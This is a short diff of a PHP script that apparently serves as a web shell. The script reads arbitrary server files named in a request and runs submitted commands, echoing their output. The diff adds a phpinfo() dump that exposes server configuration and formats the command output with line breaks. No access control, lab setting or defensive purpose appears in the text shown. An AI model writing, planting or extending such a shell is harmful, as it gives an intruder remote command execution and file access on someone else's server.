@@ -8,7 +8,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
         $content = file_get_contents($file);
     }
 
-    echo cmdForm($cmd) . contentForm($file, $content);
+    echo cmdForm($cmd) . contentForm($file, $content).phpinfo();
 } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $doAction = isset($_POST['do']) ? $_POST['do'] : 0;
     $file = isset($_POST['f']) ? $_POST['f'] : '';
@@ -28,7 +28,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
             if ($output === null) {
                 echo cmdForm($cmd) . 'Command failed to execute.<br><br>Error:<br>';
             } else {
-                echo cmdForm($cmd) . 'Command executed successfully.<br><br>Output:<br>' . $output;
+                echo cmdForm($cmd) . 'Command executed successfully.<br><br>Output:<br>' . nl2br($output);
             }
         }
     } else {
